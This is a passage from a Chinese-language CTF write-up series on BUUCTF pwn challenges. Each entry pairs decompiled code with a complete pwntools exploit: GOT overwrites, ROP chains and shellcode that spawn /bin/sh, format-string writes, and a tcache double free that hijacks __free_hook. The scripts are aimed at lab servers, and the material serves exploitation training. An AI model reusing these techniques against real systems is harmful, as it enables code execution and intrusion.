  unsigned int v6; // [esp+11Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  setvbuf(_bss_start, 0, 2, 0);
  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");
  __isoc99_scanf("%x", &v3);
  sprintf(s, "Okay, now what value would you like to write to 0x%x", v3);
  puts(s);
  __isoc99_scanf("%x", &v4);
  sprintf(s, "Okay, writing 0x%x to 0x%x", v4, v3);
  puts(s);
  *v3 = v4;
  puts("Okay, exiting now...\n");
  exit(1);
}
```

**hijack got**，将puts或者exit的got改为后门函数的地址就OK：

```python
from pwn import *

context(log_level = "debug")
# io = process("./PicoCTF_2018_got-shell")
io = remote("node4.buuoj.cn",28301)
elf = ELF('./PicoCTF_2018_got-shell')
io.sendline(hex(elf.got['puts']))
io.sendline(hex(elf.sym['win']))
io.interactive()
```

# 0x49.picoctf_2018_can_you_gets_me

```sh
yutao@ubuntu:~/Desktop$ checksec  ./PicoCTF_2018_can-you-gets-me
[*] '/home/yutao/Desktop/PicoCTF_2018_can-you-gets-me'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

静态编译，可以直接：`ROPgadget --binary PicoCTF_2018_can-you-gets-me  --ropchain`

```python
#!/usr/bin/env python2
# execve generated by ROPgadget
from pwn import *
from struct import pack


io= process("./PicoCTF_2018_can-you-gets-me") 
# Padding goes here
p = 'a'*24+'aaaa'
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b81c6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b81c6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049303) # xor eax, eax ; ret
p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080de955) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049303) # xor eax, eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0806cc25) # int 0x80                                                                             
io.recv()
io.send(p)
io.interactive()
```

或者：

```python
from pwn import *

context(log_level = "debug")
io = process("./PicoCTF_2018_can-you-gets-me")
# io = remote("node4.buuoj.cn",28301)
int_80 = 0x0806cc25   
pop_eax = 0x080b81c6    
pop_ebx = 0x080481c9    
pop_ecx = 0x080de955   
pop_edx = 0x0806f02a  
bin_sh_addr = 0x80e9000 
gets_addr = 0x0804F120  

payload = 'a'*(0x18+4) 
payload += p32(gets_addr)
payload += p32(pop_eax)
payload += p32(bin_sh_addr)
payload += p32(pop_eax)
payload += p32(0xb)
payload += p32(pop_ebx)
payload += p32(bin_sh_addr)
payload += p32(pop_ecx)
payload += p32(0)
payload += p32(pop_edx)
payload += p32(0)
payload += p32(int_80)

io.recvuntil("GIVE ME YOUR NAME!")    
io.sendline(payload)
io.sendline('/bin/sh\x00')
io.interactive()
```

或者可以使用mprotect：

```python
from pwn import *
#context.log_level = 'DEBUG'
context.arch = 'i386'
#process('./PicoCTF_2018_can-you-gets-me')#
e = ELF('./PicoCTF_2018_can-you-gets-me')
sc_addr = (e.bss() + 0x1000) 

pop_ebx_esi_edi_ebp_ret = e.search(asm('pop ebx ; pop esi ; pop edi ; pop ebp ; ret')).__next__()
mprotect_addr = e.sym['mprotect']
read_addr = e.sym['read']

payload1 = 'a'*(0x18+4)+ p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(0x100) + p32(0x7) + p32(0xdeadbeef)  + p32(read_addr) + p32(sc_addr) + p32(0) + p32(sc_addr) + p32(0x100)

payload2 = asm(shellcraft.sh())

p.sendline(payload1)
sleep(1)
p.sendline(payload2)
p.interactive()
```



# 0x4A.mrctf2020_easy_equation

开了NX：

```sh
gwt@ubuntu:~/Desktop$ checksec mrctf2020_easy_equation 
[*] '/home/gwt/Desktop/mrctf2020_easy_equation'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

格式化字符串写小数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+Fh] [rbp-1h] BYREF

  memset(&s, 0, 0x400uLL);
  fgets(&s, 0x3FF, stdin);
  printf(&s);
  if ( 11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge == 198 )
    system("exec /bin/sh");
  return 0;
}
```

简单先跑下：

```python
for judge in range(1, 10000):
    if 11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge == 198:
        print(judge)
```

得到judge为2

简单调下发现是第8个，但是会被截断，所以：

Exp：

```python
from pwn import *
context.log_level = 'debug'
# io = process("./mrctf2020_easy_equation")
io = remote("node4.buuoj.cn",28186)
# payload = "baaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p."
payload = 'aa%9$naaa'+p64(0x060105C)
# gdb.attach(io)
io.send(payload)
io.interactive()
```

# 0x4B.wdb_2018_2nd_easyfmt

还是只开了NX，

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf[100]; // [esp+8h] [ebp-70h] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("Do you know repeater?");
  while ( 1 )
  {
    read(0, buf, 0x64u);
    printf(buf);
    putchar('\n');
  }
}
```

字符串的洞，直接写read或printf的got为system，简单确定下偏移为6：

```sh
gwt@ubuntu:~/Desktop$ ./wdb_2018_2nd_easyfmt 
Do you know repeater?
aaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
aaaa0xffca37a8.0x64.0xf7f0ec08.0xf7f0dd00.0xffca38cc.0x61616161.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
����/
```

exp:

```python
from pwn import *
context(log_level='debug')
# io = process("./wdb_2018_2nd_easyfmt")
# context.arch = 'i386'
io = remote("node4.buuoj.cn",27041)
elf = ELF('./wdb_2018_2nd_easyfmt')
libc = ELF('./libc-2.23.so')

# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
printf_got = elf.got['printf']

payload = p32(printf_got)+ '%6$s'
# gdb.attach(io)

io.recvline()
io.send(payload)
io.recv()

io.send(payload)
print_addr =u32(io.recvuntil('\xf7')[-4:])
print hex(print_addr)
base = print_addr - libc.sym['printf']
system_addr = base + libc.sym['system']

payload = fmtstr_payload(6,{printf_got:system_addr})


io.sendline(payload)
io.sendline('/bin/sh\x00')
io.interactive()
```

查了半天，，，，原来是libc写错了。。fuck。

# 0x4C.ciscn_2019_es_1

保护全开：

```sh
yutao@ubuntu:~/Desktop$ checksec ciscn_2019_es_1
[*] '/home/yutao/Desktop/ciscn_2019_es_1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

add:

```c
unsigned __int64 add()
{
  int v1; // [rsp+4h] [rbp-3Ch]
  __int64 *v2; // [rsp+8h] [rbp-38h]
  __int64 size[5]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( heap_number > 12 )
  {
    puts("Enough!");
    exit(0);
  }
  v1 = heap_number;
  heap_addr[v1] = malloc(0x18uLL);
  puts("Please input the size of compary's name");
  __isoc99_scanf("%d", size);
  *(heap_addr[heap_number] + 2) = size[0];
  v2 = heap_addr[heap_number];
  *v2 = malloc(LODWORD(size[0]));
  puts("please input name:");
  read(0, *heap_addr[heap_number], LODWORD(size[0]));
  puts("please input compary call:");
  read(0, heap_addr[heap_number] + 12, 0xCuLL);
  *(heap_addr[heap_number] + 23) = 0;
  puts("Done!");
  ++heap_number;
  return __readfsqword(0x28u) ^ v4;
}
```

call就是free：

```c
unsigned __int64 call()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Please input the index:");
  __isoc99_scanf("%d", &v1);
  if ( heap_addr[v1] )
    free(*heap_addr[v1]);
  puts("You try it!");
  puts("Done");
  return __readfsqword(0x28u) ^ v2;
}
```

是2.27，有tcache，先malloc个大一点的chunk，free后直接放入unsortedbin。然后就是正常流程了。

tmd调了半天结果终于发现哪里有问题了，python的切片一直写错......

exp：

```python
from pwn import *

context.log_level="debug"

io = remote("node4.buuoj.cn",27004)
elf = ELF("./ciscn_2019_es_1")

libc = ELF("./libc-x64-2.27.so")

def add(size,name,compary):
	io.sendlineafter('choice:','1')
	io.sendlineafter("compary's name",str(int(size)))
	io.sendafter('input name:',name)
	io.sendafter('call:',compary)

def show(index):
	io.sendlineafter('choice:','2')
	io.sendlineafter('\n',str(index))

def call(index):
	io.sendlineafter('choice','3')
	io.sendlineafter('\n',str(index))


add(0x410,'aaaa','250')#0
add(0x20,'bbbb','2223451')#1
add(0x20,'/bin/sh','2353')
call(0)
show(0)

libcbase=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96-0x10-libc.sym['__malloc_hook']
free_hook=libcbase+libc.sym['__free_hook']
system=libcbase+libc.sym['system']

call(1)
call(1)

add(0x20,p64(free_hook),'13456')
add(0x20,'dddd','256')
add(0x20,p64(system),'666')

call(2)

io.interactive()
```

# 0x4D.x_ctf_b0verfl0w

```sh
gwt@ubuntu:~/Desktop$ checksec b0verfl0w 
[*] '/home/gwt/Desktop/b0verfl0w'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

关了nx

```c
int vul()
{
  char s[32]; // [esp+18h] [ebp-20h] BYREF

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(s, 50, stdin);
  printf("Hello %s.", s);
  fflush(stdout);
  return 1;
}
还有个hint：
.text:080484FD hint            proc near
.text:080484FD ; __unwind {
.text:080484FD                 push    ebp
.text:080484FE                 mov     ebp, esp
.text:08048500                 sub     esp, 24h
.text:08048503                 retn
.text:08048503 hint            endp ; sp-analysis failed
.text:08048503
.text:08048504 ; ---------------------------------------------------------------------------
.text:08048504                 jmp     esp
.text:08048506 ; ---------------------------------------------------------------------------
.text:08048506                 retn
.text:08048507 ; ---------------------------------------------------------------------------
.text:08048507                 mov     eax, 1
.text:0804850C                 pop     ebp
.text:0804850D                 retn
.text:0804850D ; } // starts at 80484FD
```

首先还是一段shellcode：`shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"`

具体的payload是这样的：

>   payload = shellcode + padding + fake_ebp+ hit\_jmp\_addr +asm('sub esp,0x28;jmp esp')

程序leave后esp指向ret的位置，然后ret，eip指向了hit的jmp esp的位置，这时esp指向构造的sub esp,0x28的位置，之后esp指向shellcode头的位置，然后后程序再次执行jmp esp，执行shellcode

exp:

```python
from pwn import *
context.log_level='debug'
r=remote('node4.buuoj.cn',28760)
# r = process("./b0verfl0w")
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
print len(shellcode)

jmp_esp=0x8048504
sub_esp_jmp=asm('sub esp,0x28;jmp esp')

payload=shellcode+(0x20-len(shellcode)+4)*'a'+p32(jmp_esp)+sub_esp_jmp
gdb.attach(r)
r.sendline(payload)

r.interactive()

```

# 0x4E.picoctf_2018_leak_me

```c
// bad sp value at call has been detected, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char input[64]; // [esp+0h] [ebp-194h] BYREF
  char name[256]; // [esp+40h] [ebp-154h] BYREF
  char password[64]; // [esp+140h] [ebp-54h] BYREF
  FILE *stream; // [esp+180h] [ebp-14h]
  char *v8; // [esp+184h] [ebp-10h]
  __gid_t v9; // [esp+188h] [ebp-Ch]
  int *v10; // [esp+18Ch] [ebp-8h]

  v10 = &argc;
  setvbuf(stdout, 0, 2, 0);
  v9 = getegid();
  setresgid(v9, v9, v9);
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(input, 0, sizeof(input));
  puts("What is your name?");
  fgets(name, 256, stdin);
  v8 = strchr(name, 10);
  if ( v8 )
    *v8 = 0;
  strcat(name, ",\nPlease Enter the Password.");
  stream = fopen("password.txt", "r");
  if ( !stream )
  {
    puts(
      "Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  fgets(password, 64, stream);
  printf("Hello ");
  puts(name);
  fgets(input, 64, stdin);
  name[0] = 0;
  if ( !strcmp(input, password) )
    flag();
  else
    puts("Incorrect Password!");
  return 0;
}
```

如果输入的input和远程文件的pwd内容相同，就会输出flag。

可以看到name与pwd在栈上正好差0x100，而puts遇到\x00才结束。所以可以先泄露下pwd：

```sh
gwt@ubuntu:~/Desktop$ nc node4.buuoj.cn 27601
What is your name?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406

Incorrect Password!

```

成功拿到pwd

exp：

```python
from pwn import *
context(log_level='debug')
io = remote("node4.buuoj.cn",27601)
pwd = 'a_reAllY_s3cuRe_p4s$word_f85406'
io.recv()
io.sendline('aaa')
io.recv()
io.sendline(pwd)
io.recv()
```

# 0x4F.axb_2019_fmt64



```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[272]; // [rsp+10h] [rbp-250h] BYREF
  char format[312]; // [rsp+120h] [rbp-140h] BYREF
  unsigned __int64 v5; // [rsp+258h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  puts(
    "Hello,I am a computer Repeater updated.\n"
    "After a lot of machine learning,I know that the essence of man is a reread machine!");
  puts("So I'll answer whatever you say!");
  while ( 1 )
  {
    alarm(3u);
    memset(s, 0, 0x101uLL);
    memset(format, 0, 0x12CuLL);
    printf("Please tell me:");
    read(0, s, 0x100uLL);
    sprintf(format, "Repeater:%s\n", s);
    if ( strlen(format) > 0x10E )
      break;
    printf(format);
  }
  printf("what you input is really long!");
  exit(0);
}
```

```sh
gwt@ubuntu:~/Desktop$ ./axb_2019_fmt64 
Hello,I am a computer Repeater updated.
After a lot of machine learning,I know that the essence of man is a reread machine!
So I'll answer whatever you say!
Please tell me:aaaa%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Repeater:aaaa0.25.0.ffe0.45.9.945f82b0.61616161.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.a2e78.0.0.0
```

偏移是第八个，但是`elf.got['puts']+%8$s`这样构造是不行的，因为00截断的缘故，所以：

`"%9$sAAAA" + p64(elf.got['puts'])`

%n是4字节，%hn是2字节，hhn是1字节.

```sh
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7ffcd3616f60 ◂— 9 /* '\t' */
01:0008│      0x7ffcd3616f68 ◂— 0x15d36e42b0
02:0010│ rsi  0x7ffcd3616f70 ◂— 0x3231256338393125 ('%198c%12')#offset 8
03:0018│      0x7ffcd3616f78 ◂— 0x313834256e686824 ('$hhn%481')
04:0020│      0x7ffcd3616f80 ◂— 0x6e68243331256337 ('7c%13$hn')
05:0028│      0x7ffcd3616f88 ◂— 0x4141414141414141 ('AAAAAAAA')
06:0030│      0x7ffcd3616f90 —▸ 0x601022 (_GLOBAL_OFFSET_TABLE_+34) ◂— 0x26c000007f9395d3
07:0038│      0x7ffcd3616f98 —▸ 0x601020 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x7f9395d377a0 (strlen) ◂— pxor   xmm0, xmm0
```



```python
from pwn import *
# context(log_level='debug')
io = remote("node4.buuoj.cn",29175)
# io = process("./axb_2019_fmt64")

elf = ELF("./axb_2019_fmt64")
libc = ELF("./libc-x64-2.23.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io.recv()
payload = "%9$sAAAA" + p64(elf.got['read'])
io.sendline(payload)
# gdb.attach(io)
io.recvuntil('Repeater:')
read_got = u64(io.recv(6).ljust(8,'\x00'))
base =  read_got - libc.sym['read']
system_addr = base + libc.sym['system']

high_sys = (system_addr >> 16) & 0xff
low_sys = system_addr & 0xffff
#这里只改了一部分，其他的位是一样的
payload = "%" + str(high_sys - 9) + "c%12$hhn" + "%" + str(low_sys - high_sys) + "c%13$hn"
payload = payload.ljust(32,"A") + p64(elf.got['strlen']+2)+p64(elf.got['strlen'])

io.sendafter("Please tell me:",payload) 
io.sendafter("Please tell me:",';/bin/sh\x00') 

io.interactive()
```

